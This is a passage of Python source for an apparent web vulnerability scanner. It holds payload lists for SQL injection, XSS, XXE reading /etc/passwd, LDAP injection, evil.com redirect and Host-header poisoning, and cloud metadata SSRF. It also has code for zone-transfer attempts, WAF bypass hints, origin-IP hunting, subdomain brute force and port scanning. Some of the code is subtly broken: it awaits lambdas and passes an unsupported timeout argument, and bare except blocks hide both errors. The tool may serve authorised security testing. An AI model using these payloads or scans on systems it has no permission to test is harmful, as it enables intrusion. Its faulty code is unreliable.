            'production', 'api', 'api2', 'api3', 'graphql', 'rest',
            'mobile', 'm', 'app', 'apps', 'blog', 'blogs', 'forum',
            'forums', 'shop', 'store', 'payment', 'payments', 'billing',
            'account', 'accounts', 'login', 'signin', 'register'
        ]

    def _save_missing_payloads(self):
        payload_files = {
            "common_dirs.txt": self.common_dirs,
            "common_files.txt": self.common_files,
            "common_params.txt": self.common_params,
            "xss_payloads.txt": self.xss_payloads,
            "sql_payloads.txt": self.sql_payloads,
            "command_payloads.txt": self.command_payloads,
            "path_traversal_payloads.txt": self.path_traversal_payloads,
            "ssrf_payloads.txt": self.ssrf_payloads,
            "nosql_payloads.txt": self.nosql_payloads,
            "ssti_payloads.txt": self.ssti_payloads,
            "xxe_payloads.txt": self.xxe_payloads,
            "crlf_payloads.txt": self.crlf_payloads,
            "jwt_payloads.txt": self.jwt_payloads,
            "graphql_payloads.txt": self.graphql_payloads,
            "common_ports.txt": [str(p) for p in self.common_ports],
            "subdomain_prefixes.txt": self.subdomain_prefixes,
            "csp_directives.txt": self.csp_directives
        }
        
        json_files = {
            "waf_signatures.json": self.waf_signatures,
            "framework_patterns.json": self.framework_patterns,
            "default_credentials.json": self.default_credentials
        }
        
        for filename, payloads in payload_files.items():
            filepath = os.path.join(self.payloads_dir, filename)
            if not os.path.exists(filepath):
                print(f"Creating missing payload file: {filename}")
                with open(filepath, 'w', encoding='utf-8') as f:
                    for payload in payloads:
                        f.write(f"{payload}\n")
        
        for filename, data in json_files.items():
            filepath = os.path.join(self.payloads_dir, filename)
            if not os.path.exists(filepath):
                print(f"Creating missing JSON file: {filename}")
                with open(filepath, 'w', encoding='utf-8') as f:
                    json.dump(data, f, indent=2, ensure_ascii=False)

    def _load_combined_payloads(self):
        print("Loading payloads from files...")
        
        text_files = {
            "common_dirs.txt": "common_dirs",
            "common_files.txt": "common_files",
            "common_params.txt": "common_params",
            "xss_payloads.txt": "xss_payloads",
            "sql_payloads.txt": "sql_payloads",
            "command_payloads.txt": "command_payloads",
            "path_traversal_payloads.txt": "path_traversal_payloads",
            "ssrf_payloads.txt": "ssrf_payloads",
            "nosql_payloads.txt": "nosql_payloads",
            "ssti_payloads.txt": "ssti_payloads",
            "xxe_payloads.txt": "xxe_payloads",
            "crlf_payloads.txt": "crlf_payloads",
            "jwt_payloads.txt": "jwt_payloads",
            "graphql_payloads.txt": "graphql_payloads",
            "common_ports.txt": "common_ports",
            "subdomain_prefixes.txt": "subdomain_prefixes",
            "csp_directives.txt": "csp_directives"
        }
        
        for filename, attr_name in text_files.items():
            filepath = os.path.join(self.payloads_dir, filename)
            if os.path.exists(filepath):
                with open(filepath, 'r', encoding='utf-8') as f:
                    file_payloads = [line.strip() for line in f if line.strip()]
                    code_payloads = getattr(self, attr_name, [])
                    
                    if attr_name == "common_ports":
                        file_payloads = [int(p) for p in file_payloads if p.strip().isdigit()]
                    
                    combined = list(set(code_payloads + file_payloads))
                    
                    if attr_name == "common_ports":
                        combined.sort()
                    else:
                        combined.sort(key=lambda x: str(x).lower())
                    
                    setattr(self, attr_name, combined)
                    print(f"  Loaded {len(file_payloads)} payloads from {filename}")
        
        json_files = {
            "waf_signatures.json": "waf_signatures",
            "framework_patterns.json": "framework_patterns",
            "default_credentials.json": "default_credentials"
        }
        
        for filename, attr_name in json_files.items():
            filepath = os.path.join(self.payloads_dir, filename)
            if os.path.exists(filepath):
                with open(filepath, 'r', encoding='utf-8') as f:
                    file_data = json.load(f)
                    code_data = getattr(self, attr_name, {})
                    
                    if isinstance(code_data, dict) and isinstance(file_data, dict):
                        merged = self._merge_dicts(code_data, file_data)
                        setattr(self, attr_name, merged)
                        print(f"  Loaded data from {filename}")
        
        print(f"All payloads loaded and ready!")

    def _merge_dicts(self, dict1, dict2):
        result = dict1.copy()
        for key, value in dict2.items():
            if key in result and isinstance(result[key], dict) and isinstance(value, dict):
                result[key] = self._merge_dicts(result[key], value)
            else:
                result[key] = value
        return result

    def _enhance_payloads(self):
        self.auth_payloads = {
            '2fa_bypass': [
                '000000', '123456', '111111', '999999',
                '1234567890', '0987654321', '1111111111',
                '{"code": "123456", "trust_device": true}',
                '{"otp": "123456", "remember_me": true}'
            ],
            'saml_injection': [
                '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">',
                '<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">',
                '<!--$-->', '<![CDATA[', ']]>'
            ],
            'oauth_manipulation': [
                'http://localhost/callback',
                'http://evil.com/callback',
                'javascript:alert(document.domain)',
                'data:text/html,<script>alert(1)</script>'
            ],
            'password_reset': [
                'admin@localhost', 'admin@127.0.0.1',
                'admin@evil.com', 'admin@attacker.com',
                '../admin', '..././admin', '%2e%2e%2fadmin'
            ]
        }
        
        self.business_logic_payloads = {
            'price_manipulation': [
                '-1', '0', '0.01', '999999999',
                '1e100', 'NaN', 'Infinity',
                '1' * 1000, 'A' * 1000
            ],
            'quantity_manipulation': [
                '-1', '0', '999999999',
                '1.5', '2.3', '1000000000',
                '1' * 100, 'A' * 100
            ],
            'race_condition': [
                'race_test', 'concurrent_test',
                'parallel_test', 'simultaneous_test'
            ]
        }
        
        self.api_advanced_payloads = {
            'soap_injection': [
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
                '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">',
                '<![CDATA[', ']]>', '<!--$-->'
            ],
            'grpc_fuzzing': [
                b'\x00' * 100, b'\xFF' * 100,
                b'\x00\x01\x02\x03' * 50,
                struct.pack('!Q', 18446744073709551615)
            ]
        }
        
        self.db_advanced_payloads = {
            'blind_sql': [
                "' AND SLEEP(5)--",
                "' OR IF(1=1,SLEEP(5),0)--",
                "' UNION SELECT NULL,NULL,SLEEP(5)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
            ],
            'time_based_sql': [
                "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND SLEEP(5)--",
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a)--",
                "' UNION SELECT NULL,NULL,NULL,NULL WHERE SLEEP(5)--"
            ],
            'oracle_specific': [
                "' UNION SELECT NULL FROM dual--",
                "' OR 1=utl_inaddr.get_host_address('google.com')--",
                "' AND (SELECT COUNT(*) FROM all_tables) > 0--"
            ],
            'mssql_specific': [
                "' UNION SELECT NULL,NULL--",
                "' OR 1=convert(int,@@version)--",
                "' AND (SELECT COUNT(*) FROM sysobjects) > 0--"
            ]
        }
        
        self.mobile_payloads = {
            'deep_link': [
                'myapp://reset-password?token=admin',
                'myapp://admin/settings',
                'intent://evil.com#Intent;scheme=https;end',
                'android-app://com.evil.app'
            ],
            'cert_pinning_bypass': [
                'ssl_verification=false',
                'trust_all_certs=true',
                'bypass_ssl=true'
            ]
        }
        
        self.cloud_payloads = {
            'aws_s3': [
                'https://s3.amazonaws.com/test',
                'http://test.s3.amazonaws.com',
                'test.s3.amazonaws.com.s3.amazonaws.com',
                '.s3.amazonaws.com'
            ],
            'azure_blob': [
                'https://test.blob.core.windows.net/',
                'https://test.file.core.windows.net/',
                'https://test.table.core.windows.net/'
            ],
            'gcp_storage': [
                'https://storage.googleapis.com/test',
                'https://test.storage.googleapis.com/',
                '.storage.googleapis.com'
            ]
        }
        
        self.container_payloads = {
            'docker_api': [
                '/containers/json',
                '/images/json',
                '/version',
                '/info'
            ],
            'kubernetes': [
                '/api/v1/pods',
                '/api/v1/secrets',
                '/api/v1/configmaps',
                '/apis/apps/v1/deployments'
            ]
        }
        
        self.cms_payloads = {
            'wordpress': [
                '/wp-content/plugins/',
                '/wp-content/themes/',
                '/wp-admin/admin-ajax.php',
                '/xmlrpc.php'
            ],
            'drupal': [
                '/sites/default/files/',
                '/modules/contrib/',
                '/themes/contrib/',
                '/update.php'
            ],
            'joomla': [
                '/administrator/',
                '/components/com_',
                '/modules/mod_',
                '/plugins/system/'
            ]
        }
        
        self.protocol_payloads = {
            'webdav': [
                'PROPFIND / HTTP/1.1',
                'SEARCH / HTTP/1.1',
                'LOCK /test.txt HTTP/1.1',
                'UNLOCK /test.txt HTTP/1.1'
            ],
            'ldap': [
                '*)(&',
                '*)(|(&',
                '*)(|(password=*)',
                '*)(|(userPassword=*)'
            ],
            'smtp': [
                'MAIL FROM:<admin@localhost>',
                'RCPT TO:<admin@localhost>',
                'DATA\r\nSubject: test\r\n\r\ntest\r\n.\r\n',
                'VRFY admin'
            ]
        }
        
        self.javascript_payloads = {
            'dom_xss': [
                '#<img src=x onerror=alert(1)>',
                'javascript:alert(document.domain)',
                'data:text/html,<script>alert(1)</script>',
                '"><svg onload=alert(1)>'
            ],
            'client_ssti': [
                '{{constructor.constructor("alert(1)")()}}',
                '${alert(1)}',
                '#{7*7}',
                '<%= 7*7 %>'
            ]
        }
        
        self.infrastructure_payloads = {
            'dns_rebinding': [
                'localhost', '127.0.0.1',
                '169.254.169.254',
                'metadata.google.internal'
            ],
            'subdomain_takeover': [
                'github.io', 'herokuapp.com',
                'azurewebsites.net', 'cloudfront.net',
                's3.amazonaws.com'
            ]
        }
        
        self.compliance_payloads = {
            'gdpr': [
                'user@example.com',
                '+1234567890',
                '123 Main St, Anytown, USA',
                '4111111111111111'
            ],
            'pci_dss': [
                '4111111111111111',
                '5500000000000004',
                '340000000000009',
                '378282246310005'
            ],
            'hipaa': [
                'John Doe', '01/01/1980',
                'SSN: 123-45-6789',
                'Diagnosis: Test'
            ]
        }
        
        self.advanced_attack_payloads = {
            'deserialization': [
                'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IA',
                'eyJfX3R5cGUiOiJBcHBsZSIsInNpemUiOjEwLCJjb2xvciI6InJlZCJ9',
                'O:8:"stdClass":1:{s:3:"foo";s:3:"bar";}',
                'a:2:{i:0;s:4:"test";i:1;s:4:"test";}'
            ],
            'http_parameter_pollution': [
                'param=value1&param=value2',
                'param[]=value1&param[]=value2',
                'param=value1%26param%3Dvalue2'
            ],
            'cache_poisoning': [
                'X-Forwarded-Host: evil.com',
                'Host: evil.com',
                'X-Forwarded-Scheme: http'
            ]
        }
        
        self.modern_web_payloads = {
            'http3': [
                ':method GET',
                ':path /',
                ':authority example.com',
                ':scheme https'
            ],
            'service_workers': [
                'Service-Worker-Allowed: /',
                'Service-Worker: script'
            ]
        }

    async def __aenter__(self):
        await self._initialize_session()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self._close_session()

    async def _initialize_session(self):
        connector = aiohttp.TCPConnector(
            limit=self.max_concurrency,
            ssl=self.verify_ssl,
            force_close=False,
            enable_cleanup_closed=True,
            use_dns_cache=True,
            ttl_dns_cache=300,
            keepalive_timeout=30
        )
        
        timeout = aiohttp.ClientTimeout(
            total=self.timeout,
            connect=10,
            sock_read=20,
            sock_connect=10
        )
        
        session_headers = {
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY',
            'X-XSS-Protection': '1; mode=block'
        }
        
        if self.scan_config.proxy_url:
            try:
                from aiohttp_socks import ProxyConnector
                connector = ProxyConnector.from_url(
                    self.scan_config.proxy_url,
                    ssl=self.verify_ssl
                )
            except ImportError:
                print("Warning: aiohttp_socks not installed, proxy disabled")
        
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers=session_headers,
            cookie_jar=self.cookie_jar
        )
        
        self.session.headers.update(self.headers)
        
        if self.cookies:
            self.session.cookie_jar.update_cookies(self.cookies)
        
        if self.scan_config.auth_token:
            self.session.headers['Authorization'] = f'Bearer {self.scan_config.auth_token}'
        elif self.scan_config.auth_username and self.scan_config.auth_password:
            auth = aiohttp.BasicAuth(self.scan_config.auth_username, self.scan_config.auth_password)
            self.session.auth = auth

    async def _close_session(self):
        if self.session:
            await self.session.close()

    async def _make_request(self, 
                           url: str, 
                           method: str = 'GET',
                           params: Dict = None,
                           data: Any = None,
                           json_data: Dict = None,
                           headers: Dict = None,
                           allow_redirects: bool = None) -> Tuple[int, Dict, str]:
        if allow_redirects is None:
            allow_redirects = self.follow_redirects
        
        try:
            async with self.session.request(
                method=method,
                url=url,
                params=params,
                data=data,
                json=json_data,
                headers=headers,
                allow_redirects=allow_redirects,
                ssl=self.verify_ssl
            ) as response:
                resp_headers = dict(response.headers)
                
                try:
                    text = await response.text()
                except:
                    text = await response.read()
                
                return response.status, resp_headers, text
                
        except aiohttp.ClientError as e:
            return 0, {}, f"Request failed: {str(e)}"
        except asyncio.TimeoutError:
            return 0, {}, "Request timeout"
        except Exception as e:
            return 0, {}, f"Unexpected error: {str(e)}"

    async def _dns_enumeration(self) -> Dict[str, List[str]]:
        dns_records = {
            'A': [], 'AAAA': [], 'MX': [], 'TXT': [],
            'NS': [], 'CAA': [], 'SOA': []
        }
        
        resolver = aiodns.DNSResolver()
        record_types = ['A', 'AAAA', 'MX', 'TXT', 'NS', 'CAA', 'SOA']
        
        for record_type in record_types:
            try:
                if record_type == 'A':
                    answers = await resolver.query(self.base_domain, 'A')
                    dns_records['A'] = [answer.host for answer in answers]
                elif record_type == 'AAAA':
                    answers = await resolver.query(self.base_domain, 'AAAA')
                    dns_records['AAAA'] = [answer.host for answer in answers]
                elif record_type == 'MX':
                    answers = await resolver.query(self.base_domain, 'MX')
                    dns_records['MX'] = [f"{answer.host} (priority: {answer.priority})" for answer in answers]
                elif record_type == 'TXT':
                    answers = await resolver.query(self.base_domain, 'TXT')
                    dns_records['TXT'] = [answer.text.decode() if isinstance(answer.text, bytes) else answer.text for answer in answers]
                elif record_type == 'NS':
                    answers = await resolver.query(self.base_domain, 'NS')
                    dns_records['NS'] = [answer.host for answer in answers]
                elif record_type == 'CAA':
                    try:
                        answers = await resolver.query(self.base_domain, 'CAA')
                        dns_records['CAA'] = [str(answer) for answer in answers]
                    except:
                        pass
                elif record_type == 'SOA':
                    try:
                        answers = await resolver.query(self.base_domain, 'SOA')
                        dns_records['SOA'] = [str(answer) for answer in answers]
                    except:
                        pass
            except aiodns.error.DNSError:
                continue
        
        return dns_records

    async def _attempt_zone_transfer(self) -> List[str]:
        transferred_records = []
        
        resolver = aiodns.DNSResolver()
        
        try:
            ns_records = await resolver.query(self.base_domain, 'NS')
            
            for ns_record in ns_records[:3]:
                ns_server = ns_record.host
                
                try:
                    transfer_results = await resolver.query(self.base_domain, 'AXFR', ns=ns_server)
                    if transfer_results:
                        transferred_records.extend([str(record) for record in transfer_results])
                except:
                    continue
        except:
            pass
        
        if transferred_records:
            vuln = Vulnerability(
                title="DNS Zone Transfer Vulnerability",
                severity="High",
                description="DNS server allows zone transfer (AXFR)",
                proof=f"Zone transfer successful from name servers",
                endpoint=f"DNS: {self.base_domain}",
                technical_detail="Zone transfer exposes all DNS records including internal infrastructure",
                remediation="Restrict zone transfers to authorized servers only",
                cvss_score=7.5,
                category="Information Disclosure"
            )
            self.vulnerabilities.append(vuln)
        
        return transferred_records

    async def _check_cdn_waf(self) -> Dict[str, Any]:
        results = {
            'cdn': None,
            'waf': None,
            'real_ip': None,
            'bypass_methods': []
        }
        
        status, headers, text = await self._make_request(self.target_url)
        
        for waf, signatures in self.waf_signatures.items():
            for sig in signatures:
                if any(sig.lower() in str(h).lower() for h in headers.values()):
                    results['waf'] = waf
                    self.waf_detected = waf
                    break
        
        try:
            resolver = aiodns.DNSResolver()
            try:
                a_records = await resolver.query(self.base_domain, 'A')
                if a_records:
                    cdn_ranges = {
                        'Cloudflare': ['104.16.0.0/12', '172.64.0.0/13'],
                        'Akamai': ['23.0.0.0/12', '184.24.0.0/13'],
                        'Fastly': ['151.101.0.0/16'],
                        'AWS CloudFront': ['130.176.0.0/16']
                    }
                    
                    for record in a_records:
                        ip = record.host
                        for cdn, ranges in cdn_ranges.items():
                            for cidr in ranges:
                                if ipaddress.ip_address(ip) in ipaddress.ip_network(cidr):
                                    results['cdn'] = cdn
                                    results['real_ip'] = await self._find_real_ip()
                                    break
            except:
                pass
        except:
            pass
        
        try:
            ctx = ssl.create_default_context()
            with socket.create_connection((self.base_domain, 443), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=self.base_domain) as ssock:
                    cert = ssock.getpeercert()
                    issuer = dict(x[0] for x in cert.get('issuer', []))
                    if 'organizationName' in issuer:
                        org = issuer['organizationName'].lower()
                        if 'cloudflare' in org:
                            results['cdn'] = 'Cloudflare'
                        elif 'akamai' in org:
                            results['cdn'] = 'Akamai'
                        elif 'amazon' in org:
                            results['cdn'] = 'AWS'
        except:
            pass
        
        if results['cdn'] or results['waf']:
            bypass_methods = [
                "Try alternate HTTP ports (81, 8080, 8443)",
                "Use HTTPS instead of HTTP or vice versa",
                "Try subdomains (dev, staging, test)",
                "Check historical DNS records",
                "Try IPv6 address",
                "Use X-Forwarded-For headers",
                "Check for origin IP in source code/mobile apps"
            ]
            results['bypass_methods'] = bypass_methods
        
        return results

    async def _find_real_ip(self) -> Optional[str]:
        methods = [
            lambda: self._dns_lookup(f"origin.{self.base_domain}"),
            lambda: self._dns_lookup(f"direct.{self.base_domain}"),
            lambda: self._dns_lookup(f"server.{self.base_domain}"),
            lambda: self._check_dns_history(),
            lambda: self._check_ssl_cert_ips()
        ]
        
        for method in methods:
            try:
                result = await method
                if result:
                    return result
            except:
                continue
        
        return None

    async def _dns_lookup(self, hostname: str) -> Optional[str]:
        try:
            resolver = aiodns.DNSResolver()
            records = await resolver.query(hostname, 'A')
            if records:
                return records[0].host
        except:
            pass
        return None

    async def _check_dns_history(self) -> Optional[str]:
        patterns = [
            f"{self.base_domain.replace('www.', '')}",
            f"direct-{self.base_domain}",
            f"ip-{self.base_domain}",
            f"server-{self.base_domain}"
        ]
        
        for pattern in patterns:
            ip = await self._dns_lookup(pattern)
            if ip:
                return ip
        
        return None

    async def _check_ssl_cert_ips(self) -> Optional[str]:
        try:
            ctx = ssl.create_default_context()
            with socket.create_connection((self.base_domain, 443), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=self.base_domain) as ssock:
                    cert = ssock.getpeercert()
                    for field in cert.get('subjectAltName', []):
                        if field[0] == 'DNS':
                            dns_name = field[1]
                            if dns_name.startswith('direct-') or dns_name.startswith('origin-'):
                                ip = await self._dns_lookup(dns_name)
                                if ip:
                                    return ip
        except:
            pass
        return None


    async def _enumerate_subdomains(self):
        subdomains = set()
        
        print(f"  Attempting subdomain enumeration for: {self.base_domain}")
        
        try:
            crt_urls = [
                f"https://crt.sh/?q={self.base_domain}&output=json",
                f"https://crt.sh/?q=*.{self.base_domain}&output=json",
                f"https://crt.sh/?identity={self.base_domain}&output=json"
            ]
            
            headers = {
                'User-Agent': self.user_agent,
                'Accept': 'application/json',
                'Connection': 'close'
            }
            
            print(f"    Querying crt.sh API...")
            
            if not self.session:
                print("    Warning: Session not initialized, creating temporary session...")
                await self._initialize_session()
            
            for crt_url in crt_urls:
                try:
                    print(f"    Trying URL: {crt_url}")
                    async with self.session.get(crt_url, headers=headers, timeout=20, ssl=False) as response:
                        if response.status == 200:
                            data_text = await response.text()
                            
                            if not data_text.strip():
                                print(f"    Empty response from crt.sh")
                                continue
                            
                            data_text = data_text.strip()
                            
                            if data_text.startswith('<'):
                                print(f"    Received HTML instead of JSON, trying next URL...")
                                continue
                            
                            try:
                                data = json.loads(data_text)
                                
                                if not data:
                                    print(f"    No data found in response")
                                    continue
                                
                                print(f"    Received {len(data)} records from crt.sh")
                                
                                for entry in data:
                                    if isinstance(entry, dict):
                                        name_fields = ['name_value', 'common_name', 'dns_names']
                                        
                                        for field in name_fields:
                                            if field in entry:
                                                value = entry[field]
                                                if value:
                                                    if isinstance(value, str):
                                                        self._process_subdomain_string(value, subdomains)
                                                    elif isinstance(value, list):
                                                        for item in value:
                                                            if isinstance(item, str):
                                                                self._process_subdomain_string(item, subdomains)
                                
                                print(f"    Found {len(subdomains)} unique subdomains from crt.sh")
                                
                                if subdomains:
                                    validated_subs = await self._validate_subdomains(list(subdomains)[:50])
                                    subdomains = set(validated_subs)
                                    print(f"    Validated {len(subdomains)} subdomains")
                                
                                break
                                
                            except json.JSONDecodeError as e:
                                print(f"    JSON decode error: {e}")
                                print(f"    Response preview: {data_text[:500]}...")
                                continue
                                
                        elif response.status == 429:
                            print(f"    Rate limited by crt.sh, waiting...")
                            await asyncio.sleep(5)
                        else:
                            print(f"    crt.sh API failed with status {response.status}")
                            
                except asyncio.TimeoutError:
                    print(f"    Timeout connecting to crt.sh")
                    continue
                except Exception as e:
                    print(f"    Error: {e}")
                    continue
            
            if not subdomains:
                print(f"    crt.sh failed, using fallback method...")
                return await self._fallback_subdomain_enum()
            
        except Exception as e:
            print(f"    Error in subdomain enumeration: {e}")
            import traceback
            traceback.print_exc()
            return await self._fallback_subdomain_enum()
        
        for subdomain in subdomains:
            self.discovered_subdomains.add(subdomain)
        
        return list(subdomains)

    def _process_subdomain_string(self, string, subdomains_set):
        if not string or not isinstance(string, str):
            return
        
        string = string.strip().lower()
        
        if string.startswith('*.'):
            string = string[2:]
        
        if '//' in string:
            string = string.split('//')[1]
        
        if ':' in string:
            string = string.split(':')[0]
        
        if '/' in string:
            string = string.split('/')[0]
        
        string = string.replace('\n', '').replace('\r', '').replace('\t', '').strip()
        
        string = string.strip('"\'`')
        
        if not string:
            return
        
        base_domain_lower = self.base_domain.lower()
        
        if string == base_domain_lower:
            return
        
        if string.endswith(f".{base_domain_lower}"):
            main_part = string[:-len(f".{base_domain_lower}")]
            if main_part and '.' not in main_part and len(main_part) > 1:
                subdomains_set.add(string)
        elif f".{base_domain_lower}." in string:
            parts = string.split('.')
            if base_domain_lower in parts:
                idx = parts.index(base_domain_lower)
                if idx > 0:
                    subdomains_set.add(string)

    async def _alternative_subdomain_sources(self):
        subdomains = set()
        
        sources = [
            self._check_virustotal,
            self._check_shodan,
            self._check_securitytrails,
            self._check_bufferover
        ]
        
        for source_func in sources:
            try:
                print(f"    Trying {source_func.__name__}...")
                results = await source_func()
                if results:
                    subdomains.update(results)
                    print(f"      Found {len(results)} subdomains from {source_func.__name__}")
            except Exception as e:
                print(f"      Error with {source_func.__name__}: {e}")
                continue
        
        return subdomains

    async def _check_bufferover(self):
        import aiohttp
        
        subdomains = set()
        
        try:
            async with aiohttp.ClientSession() as session:
                url = f"https://dns.bufferover.run/dns?q=.{self.base_domain}"
                headers = {'User-Agent': self.user_agent}
                
                async with session.get(url, headers=headers, timeout=10) as response:
                    if response.status == 200:
                        data = await response.json()
                        
                        if 'FDNS_A' in data:
                            for entry in data['FDNS_A']:
                                parts = entry.split(',')
                                if len(parts) == 2:
                                    domain = parts[1].strip()
                                    if domain.endswith(self.base_domain):
                                        subdomains.add(domain)
                        
                        if 'RDNS' in data:
                            for entry in data['RDNS']:
                                parts = entry.split(',')
                                if len(parts) == 2:
                                    domain = parts[1].strip()
                                    if domain.endswith(self.base_domain):
                                        subdomains.add(domain)
        except:
            pass
        
        return subdomains

    async def debug_subdomains(self):
        print("\n=== DEBUG SUBDOMAIN ENUMERATION ===")
        print(f"Target: {self.base_domain}")
        print(f"Discovered subdomains count: {len(self.discovered_subdomains)}")
        
        if self.discovered_subdomains:
            print("Found subdomains:")
            for i, sub in enumerate(sorted(self.discovered_subdomains), 1):
                print(f"  {i}. {sub}")
        else:
            print("No subdomains found!")
        
        if 'subdomains' in self.results.information:
            print(f"Subdomains in results.information: {len(self.results.information['subdomains'])}")
        else:
            print("No subdomains in results.information")


    async def _validate_subdomains(self, subdomains):
        validated = []
        
        tasks = []
        for subdomain in subdomains:
            tasks.append(self._quick_subdomain_check(subdomain))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for subdomain, exists in zip(subdomains, results):
            if exists and isinstance(exists, bool):
                validated.append(subdomain)
        
        return validated

    async def _quick_subdomain_check(self, subdomain):
        try:
            resolver = aiodns.DNSResolver()
            try:
                await resolver.query(subdomain, 'A')
                return True
            except aiodns.error.DNSError:
                pass
            
            for scheme in ['https', 'http']:
                try:
                    url = f"{scheme}://{subdomain}"
                    status, headers, text = await self._make_request(url, timeout=3)
                    if status not in [0, 404]:
                        return True
                except:
                    continue
        
        except:
            pass
        
        return False

    async def _fallback_subdomain_enum(self):
        print("    Using fallback subdomain enumeration method")
        
        subdomains = set()
        
        common_prefixes = [
            'www', 'mail', 'ftp', 'smtp', 'pop', 'imap', 'webmail',
            'admin', 'administrator', 'secure', 'ssl', 'vpn', 'portal',
            'test', 'testing', 'dev', 'development', 'staging', 'prod',
            'production', 'api', 'api2', 'api3', 'graphql', 'rest',
            'mobile', 'm', 'app', 'apps', 'blog', 'blogs', 'forum',
            'forums', 'shop', 'store', 'payment', 'payments', 'billing',
            'account', 'accounts', 'login', 'signin', 'register',
            'signup', 'auth', 'auth2', 'oauth', 'static', 'assets',
            'cdn', 'media', 'images', 'img', 'video', 'videos',
            'download', 'uploads', 'files', 'docs', 'documentation',
            'help', 'support', 'status', 'monitor', 'monitoring',
            'analytics', 'stats', 'metrics', 'dashboard', 'control',
            'panel', 'cpanel', 'whm', 'webdisk', 'webmin', 'plesk',
            'directadmin', 'ns1', 'ns2', 'ns3', 'ns4', 'dns1', 'dns2',
            'mx', 'mx1', 'mx2', 'mail1', 'mail2', 'email', 'web',
            'web1', 'web2', 'server', 'server1', 'server2', 'host',
            'host1', 'host2', 'cloud', 'cloud1', 'storage', 'backup',
            'db', 'database', 'sql', 'mysql', 'mongo', 'redis',
            'elastic', 'kibana', 'grafana', 'prometheus', 'jenkins',
            'git', 'gitlab', 'github', 'svn', 'repo', 'repository',
            'registry', 'docker', 'k8s', 'kubernetes', 'vagrant',
            'vm', 'virtual', 'vps', 'demo', 'sandbox', 'playground',
            'beta', 'alpha', 'gamma', 'canary', 'nightly', 'unstable',
            'old', 'new', 'legacy', 'archive', 'historical', 'temp',
            'temporary', 'staging2', 'preprod', 'uat', 'qa', 'test2'
        ]
        
        print(f"    Testing {len(common_prefixes)} common subdomains...")
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            loop = asyncio.get_event_loop()
            tasks = []
            
            for prefix in common_prefixes:
                subdomain = f"{prefix}.{self.base_domain}"
                task = loop.run_in_executor(executor, self._sync_check_subdomain, subdomain)
                tasks.append((subdomain, task))
            
            for subdomain, task in tasks:
                try:
                    exists = await asyncio.wait_for(task, timeout=2)
                    if exists:
                        subdomains.add(subdomain)
                        print(f"      Found: {subdomain}")
                except (asyncio.TimeoutError, Exception):
                    pass
        
        wordlist_paths = [
            os.path.join(self.payloads_dir, "subdomain_prefixes.txt"),
            "subdomains-100.txt",
        ]
        
        for wordlist_path in wordlist_paths:
            if os.path.exists(wordlist_path):
                try:
                    with open(wordlist_path, 'r', encoding='utf-8') as f:
                        additional_prefixes = [line.strip() for line in f if line.strip()]
                    
                    print(f"    Testing additional {len(additional_prefixes)} prefixes from {wordlist_path}...")
                    
                    batch_size = 20
                    for i in range(0, len(additional_prefixes), batch_size):
                        batch = additional_prefixes[i:i+batch_size]
                        
                        batch_tasks = []
                        for prefix in batch:
                            subdomain = f"{prefix}.{self.base_domain}"
                            task = loop.run_in_executor(executor, self._sync_check_subdomain, subdomain)
                            batch_tasks.append((subdomain, task))
                        
                        for subdomain, task in batch_tasks:
                            try:
                                exists = await asyncio.wait_for(task, timeout=2)
                                if exists:
                                    subdomains.add(subdomain)
                            except (asyncio.TimeoutError, Exception):
                                pass
                        
                        await asyncio.sleep(0.5)
                        
                except Exception as e:
                    print(f"    Error reading wordlist {wordlist_path}: {e}")
        
        for subdomain in subdomains:
            self.discovered_subdomains.add(subdomain)
        
        print(f"    Found {len(subdomains)} subdomains via brute force")
        return list(subdomains)

    def _sync_check_subdomain(self, subdomain):
        import socket
        
        try:
            socket.gethostbyname(subdomain)
            return True
        except socket.gaierror:
            return False
        except Exception:
            return False

    async def _port_scan(self) -> Dict[int, Dict[str, Any]]:
        results = {}
        
        try:
            ip = socket.gethostbyname(self.base_domain)
        except:
            return results
        
        async def scan_port(port: int):
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(ip, port),
                    timeout=2
                )
                
                writer.write(b"\r\n")
                await writer.drain()
                
                try:
                    banner = await asyncio.wait_for(reader.read(1024), timeout=1)
                    banner = banner.decode('utf-8', errors='ignore').strip()
                except:
                    banner = ""
                
                writer.close()
                await writer.wait_closed()
                
                service = self._identify_service(port, banner)
                
                results[port] = {
                    'state': 'open',
                    'service': service,
                    'banner': banner,
                    'vulnerabilities': []
                }
                
                vulns = await self._check_port_vulnerabilities(port, service, banner)
                results[port]['vulnerabilities'] = vulns
                
                self.discovered_ports.add(port)
                
            except (ConnectionRefusedError, asyncio.TimeoutError, OSError):
                pass
            except Exception as e:
                pass
        
        tasks = [scan_port(port) for port in self.common_ports]
        await asyncio.gather(*tasks, return_exceptions=True)
        
        return results

    def _identify_service(self, port: int, banner: str) -> str:
        port_service_map = {
            21: 'ftp', 22: 'ssh', 23: 'telnet', 25: 'smtp',
            53: 'dns', 80: 'http', 110: 'pop3', 143: 'imap',
            443: 'https', 445: 'smb', 993: 'imaps', 995: 'pop3s',
            3306: 'mysql', 3389: 'rdp', 5432: 'postgresql',
            6379: 'redis', 27017: 'mongodb', 8080: 'http-proxy',
